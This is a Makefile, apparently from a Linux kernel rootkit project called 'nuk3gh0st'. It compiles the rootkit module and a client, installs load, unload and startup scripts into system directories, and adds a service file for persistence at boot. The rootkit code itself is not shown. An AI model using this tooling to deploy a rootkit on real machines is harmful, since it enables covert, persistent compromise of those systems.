.PHONY: all
obj-m := rootkit.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: rootkit client
rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
client:
	gcc -o nuk3gh0st nuk3gh0st.c --std=gnu99 -Wall -Wextra -pedantic
install:
	mkdir /usr/share/nuk3gh0st
	cp nuk3gh0st /usr/bin/nuk3gh0st
	cp rootkit.ko /usr/share/nuk3gh0st/rootkit.ko
	cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
	cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
	cp startup-nuk3gh0st /usr/bin/startup-nuk3gh0st
	cp rmstartup-nuk3gh0st /usr/bin/rmstartup-nuk3gh0st
	cp nuk3gh0st.startup /usr/share/nuk3gh0st/nuk3gh0st.startup
	cp nuk3gh0st.service /usr/share/nuk3gh0st/nuk3gh0st.service
	chmod +x /usr/bin/load-nuk3gh0st
	chmod +x /usr/bin/unload-nuk3gh0st
	chmod +x /usr/bin/startup-nuk3gh0st
	chmod +x /usr/bin/rmstartup-nuk3gh0st
	chmod +x /usr/share/nuk3gh0st/nuk3gh0st.startup
uninstall:
	rm /usr/bin/nuk3gh0st
	rm /usr/bin/load-nuk3gh0st
	rm /usr/bin/unload-nuk3gh0st
	rm /usr/bin/startup-nuk3gh0st
	rm /usr/bin/rmstartup-nuk3gh0st
	rm -rf /usr/share/nuk3gh0st/
clean:
	rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
